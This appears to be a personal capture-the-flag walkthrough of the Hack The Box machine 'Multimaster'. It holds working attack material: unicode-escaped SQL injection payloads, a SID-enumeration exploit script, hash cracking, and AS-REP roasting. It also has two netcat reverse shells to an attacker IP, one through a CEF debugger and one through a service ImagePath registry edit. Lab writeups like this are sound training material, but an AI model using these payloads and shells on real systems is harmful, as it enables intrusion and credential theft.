MACHINE - Multimaster 
ip 10.10.10.179 
# first we need aq nmap scan 
results 
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: MegaCorp
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-28 23:05:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
##
##
##
$first take a look at webpage$ 
added ip into my hosts file http://multimaster.htb 
in webpage we have three buttons
#w3b p4g3
HUB
GALLERY
COLLOEAGUE FINDER 
I ENUMERATED BOTH ONE BY ONE 
AFTER THAT COLLEAGUE FINDER 
WHEN I SEARCHED ANYTHING IN SEARCH BAR I GOT NOTHING 
THEN I intercept the req and send it to repeater 
then i got some usernames 
#
#
#
USERS 
-----------------------------------------------
sbauer@megacorp.htb
okent@megacorp.htb
ckane@megacorp.htb
kpage@megacorp.htb
shayna@megacorp.htb
james@megacorp.htb
cyork@megacorp.htb
rmartin@megacorp.htb
jorden@megacorp.htb
zac@megacorp.htb
alyx@megacorp.htb
ilee@megacorp.htb
nbourne@megacorp.htb
zpowers@megacorp.htb
aldom@megacorp.htb
minato@megacorp.htb
egre55@megacorp.htb
-------------------------------------------------------
//////$end$
now i have to bypass waf 
using unicode escape 
# Usage - 
IMPORTANT-: IT's not a proper sql it's also dumb 
we have two ways 
1.-' UNION SELECT 1,2,3,username,password FROM Logins--
2. i just did order by 100 
#Command
curl -i -s -k -X $'POST'     -H $'Host: multimaster.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://multimaster.htb/' -H $'Content-Type: application/json;charset=utf-8' -H $'Content-Length: 329' -H $'Connection: close'     --data-binary $'{\"name\":\"\\u002d\\u0027\\u0020\\u0055\\u004e\\u0049\\u004f\\u004e\\u0020\\u0053\\u0045\\u004c\\u0045\\u0043\\u0054\\u0020\\u0031\\u002c\\u0032\\u002c\\u0033\\u002c\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u002c\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0020\\u0046\\u0052\\u004f\\u004d\\u0020\\u004c\\u006f\\u0067\\u0069\\u006e\\u0073\\u002d\\u002d\"}'     $'http://multimaster.htb/api/getColleagues' > response_from_curl_hashes_for_users.txt 

##
HASHES -:
<start>
1.9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
2.fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
3.68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
4.cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
these hashes are Keccak-384 i can decode using hashcat 
</end>
also some kinda usernames also we have in our curl response 
#Usernames from curl 
aldom
ckane 
egre55
james 
kpage 
nbourne 
rmartin
shayna 
zpowers  
###
Decoding hashes using hashcat-:
root@softwareuser:~/Desktop/multimaster# hashcat -m 17900 -D 1 -a 0 -n 10 hashes.txt /usr/share/wordlists/rockyou.txt --force 
root@softwareuser:~/Desktop/multimaster# hashcat -m 17900 hashes.txt --show
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
now i need a script({sid enumerating script}) to get sid 
#exploit 
#! /usr/bin/env python2

import requests
import re
import json
import time


def little(string):
    t= bytearray.fromhex(string)
    t.reverse()
    return ''.join(format(x,'02x') for x in t).upper()


url = 'http://10.10.10.179/api/getColleagues'
c = 1100
for x in range(1100, 6100, 1000):
	for c in range(15):
		SID = '0x0105000000000005150000001C00D1BCD181F1492BDFC236'
		JUNK = '0' + hex((x+c))[2:].upper()
		RID = SID + little(JUNK) + 4 * '0'
		print('[+] RID Is : {}'.format(RID))
		# payload = raw_input('Payload : ')
		print('[*] Counter is : {}'.format((x+c)))
		payload = "-' union select 1,2,3,4,SUSER_SNAME({})-- -".format(RID)
		pattern = re.compile(r'([0-9a-f]{2})')
		payload = pattern.sub(r"\\u00\1", payload.encode('hex'))
		# print('[+] Sending payload : {0}'.format(payload))
		r = requests.post(url, data='{"name": "' + payload+ '"}', headers={'Content-Type':'application/json;charset=utf-8'})
		if '403 - Forbidden: Access is denied.' in r.text:
			print('[-] Sleeping until WAF cooldown')
			time.sleep(10)
			continue
		print(r.text)
		jsona = json.loads(r.text)
		try:
			if jsona:
				for element in jsona: 
					del element[u'position']
					del element[u'id']
					del element[u'email']
					del element[u'name']
		except TypeError:
			if jsona:
				del jsona[u'position']
				del jsona[u'id']
				del jsona[u'email']
				del jsona[u'name']
		data = json.dumps(jsona, sort_keys=True, indent=4)
		print(data)
		c += 1
</exploit.py><end>
after running i got long respone including some new users name 
# Users 
DnsAdmins
DnsUpdateProxy
svc-nas
Privileged IT Accounts
andrew
tushikikatomo
lana
dai
svc-sql
sbauer
okent
ckane
kpage
james
cyork
rmartin
zac
jorden
alyx
ilee
nbourne
zpowers
#USER_END
# NOW probably i can try crackmapexec for valid login huh !!!
i sucessfully got valid login 
MEGACORP\\tushikikatomo
password - finance1 
now i need to get a shell for windows i always use evil winrm -   
##usage 
root@softwareuser:~/Desktop/multimaster# evil-winrm -i 10.10.10.179 -u tushikikatomo -p finance1 

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\alcibiades\Documents> cd ../
*Evil-WinRM* PS C:\Users\alcibiades> cd Desktop 
*Evil-WinRM* PS C:\Users\alcibiades\Desktop> cat user.txt 
*Evil-WinRM* PS C:\Users\alcibiades\Desktop> 
#usage### 
done now i have user.txt 
---------------------------------
-------------------------------

# root part - 
Now i got a nudge from forums and my friends 
(link)https://github.com/taviso/cefdebug/releases/tag/v0.2
they said me to use cefdebug and nc to execute command locally then i did 
i created a dir in c:/
-------------------------------------------------------------------------------------------------------
*Evil-WinRM* PS C:\temo> upload cefdebug.exe
Info: Uploading cefdebug.exe to C:\temo\cefdebug.exe

                                                             
Data: 346112 bytes of 346112 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\temo> ./cefdebug
cefdebug.exe : [2020/05/04 16:39:11:1622] U: There are 5 tcp sockets in state listen.
    + CategoryInfo          : NotSpecified: ([2020/05/04 16:...n state listen.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2020/05/04 16:39:31:2215] U: There were 3 servers that appear to be CEF debuggers.
[2020/05/04 16:39:31:2215] U: ws://127.0.0.1:41714/92e1307f-5e07-4548-88db-1b2032853794
[2020/05/04 16:39:31:2215] U: ws://127.0.0.1:23790/932cb619-3803-4f06-9adf-b9331cb2fcc8
[2020/05/04 16:39:31:2215] U: ws://127.0.0.1:11164/6069f187-3df0-4bf9-bf41-80a48cb1fd37
*Evil-WinRM* PS C:\temo> ./cefdebug.exe --url  ws://127.0.0.1:41714/92e1307f-5e07-4548-88db-1b2032853794 --code "process.mainModule.require('child_process').exec('cmd.exe /c C:/temo/nc.exe 10.10.16.76  6666 -e cmd.exe')
At line:1 char:88
+ ... 3794 --code "process.mainModule.require('child_process').exec('cmd.ex ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
The string is missing the terminator: ".
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : TerminatorExpectedAtEndOfString,Microsoft.PowerShell.Commands.InvokeExpressionCommand
*Evil-WinRM* PS C:\temo> ./cefdebug.exe --url  ws://127.0.0.1:41714/92e1307f-5e07-4548-88db-1b2032853794 --code "process.mainModule.require('child_process').exec('cmd.exe /c C:/temo/nc.exe 10.10.16.76  6666 -e cmd.exe')"
cefdebug.exe : [2020/05/04 16:40:45:0599] U: >>> process.mainModule.require('child_process').exec('cmd.exe /c C:/temo/nc.exe 10.10.16.76  6666 -e cmd.exe')
    + CategoryInfo          : NotSpecified: ([2020/05/04 16:...66 -e cmd.exe'):String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2020/05/04 16:40:45:0599] U: <<< ChildProcess
*Evil-WinRM* PS C:\temo> 

-----------------------------------------------------------------------------
                                      END
--------------------------------------------------------------------------------
steps for root#
#after getting a shell i tried to enumerate then 

cd /
cd /inetpub/wwwroot/bin
type MultimasterAPI.dll
##Main thing 
({whoami [megacorp\cyork]})
--------------------------------------from API dll--------------------
MASTER7{ "info" : "MegaCorp API" }!application/json?.server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;	nameaSelect * from Colleagues where name like '%{0}%'idposition
userany-D3veL0pM3nT!
--------------------------------------------------------------------------------------------------------------------------------
Command I tried every users from this 
*Evil-WinRM* PS C:\temo> Get-ADGroupMember -Identity Developers
Evil-WinRM* PS C:\temo> Get-ADGroupMember -Identity Developers


distinguishedName : CN=Sarina Bauer,OU=New York,OU=Employees,DC=MEGACORP,DC=LOCAL
name              : Sarina Bauer
objectClass       : user
objectGUID        : 548955df-e515-41c1-9afa-8130103570e2
SamAccountName    : sbauer
SID               : S-1-5-21-3167813660-1240564177-918740779-3102

distinguishedName : CN=Connor York,OU=New York,OU=Employees,DC=MEGACORP,DC=LOCAL
name              : Connor York
objectClass       : user
objectGUID        : 6c3c78ec-7e0a-48be-95d7-edd410457515
SamAccountName    : cyork
SID               : S-1-5-21-3167813660-1240564177-918740779-3107

distinguishedName : CN=Jorden Mclean,OU=Athens,OU=Employees,DC=MEGACORP,DC=LOCAL
name              : Jorden Mclean
objectClass       : user
objectGUID        : 0fa62545-eff1-4805-b16f-a18cf4217418
SamAccountName    : jorden
SID               : S-1-5-21-3167813660-1240564177-918740779-3110

distinguishedName : CN=Alessandro Dominguez,OU=London,OU=Employees,DC=MEGACORP,DC=LOCAL
name              : Alessandro Dominguez
objectClass       : user
objectGUID        : 0d1589a0-e3ae-431b-8568-b99922fdc40f
SamAccountName    : aldom
SID               : S-1-5-21-3167813660-1240564177-918740779-3115


i tried every user from them then i got access 
-----------------------------------------------------------
root@softwareuser:~/Desktop/multimaster# evil-winrm -i multimaster.htb -u sbauer -p D3veL0pM3nT!

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sbauer\Documents> 
-----------------------------------------------------------------------------------------------------
now i still don't have a fucking permission need to enumerate more-more more ~~~
-------------------------------------------------------------------

*Evil-WinRM* PS C:\Users\sbauer\Desktop> whoami /all

USER INFORMATION
----------------

User Name       SID
=============== =============================================
megacorp\sbauer S-1-5-21-3167813660-1240564177-918740779-3102


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                           Attributes
=========================================== ================ ============================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
MEGACORP\Developers                         Group            S-1-5-21-3167813660-1240564177-918740779-3119 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\sbauer\Desktop> 

--------------------------------------------------
next -
Set-ADAccountControl -Identity jorden -doesnotrequirepreauth $true
and then getnpusers.py 	   	 		to dump hash 	

--------------------------
root@softwareuser:/usr/share/doc/python3-impacket/examples# sudo python GetNPUsers.py MEGACORP.local/sbauer:"D3veL0pM3nT!" -dc-ip multimaster.htb -reques
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

Name    MemberOf                                      PasswordLastSet             LastLogon  UAC      
------  --------------------------------------------  --------------------------  ---------  --------
jorden  CN=Developers,OU=Groups,DC=MEGACORP,DC=LOCAL  2020-01-10 06:18:17.503303  <never>    0x410200 



$krb5asrep$23$jorden@MEGACORP.LOCAL:018e21dd9830737995b5dc6f77e48ffa$302a6487a970d34d4841fb1216b3484de0d4c27ffadb144b1ec4e496ca4e9f610047c302251b8e38d25fbf5f44617562ba2ffda693a368052fbc166691b1ab93916c11841a9798ad771083cd35c88aa8de94afd23af66de39fe24a9f78da2307355d0c22541b7ee01b8846a69fd9f638500e96ab5bc6d20159db057fe39391b428903c5f914aae5c1b39c8c5b4655fdf6d306333e500f33a64336bb38b33a97b9dca3253fe0cbc67fa96a163bfe6816da8cef55a420713f21be9b8ada35fff89c0f24abfcd0b7b1223411cd43a4b624a00fcaf6247f4b30e0008d57550cc3c9a120aadb462cb3c36e5f818ddd27fa755
root@softwareuser:/usr/share/doc/python3-impacket/examples# 
------------------------------------  18200 | Kerberos 5 AS-REP etype 23                       | Network Protocols
after decoding got pass
rainforest786 
-------------
root@softwareuser:~/Desktop/multimaster# evil-winrm -i multimaster.htb -u jorden -p rainforest786

-------------

REG add HKLM\System\CurrentControlSet\Services\SensorDataService /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\temo\nc.exe 10.10.16.76 9999 -e cmd.exe" /f

then start a listner before nc -lnvp 9999
sc.exe start SensorDataService 
boom u have admin shell now 
software_user23
----------------------
user.txt - 2f9392de28a8fc47fe2508a403dae3ab
root.txt - 31c22359535630fb3bf8bef7476ac512

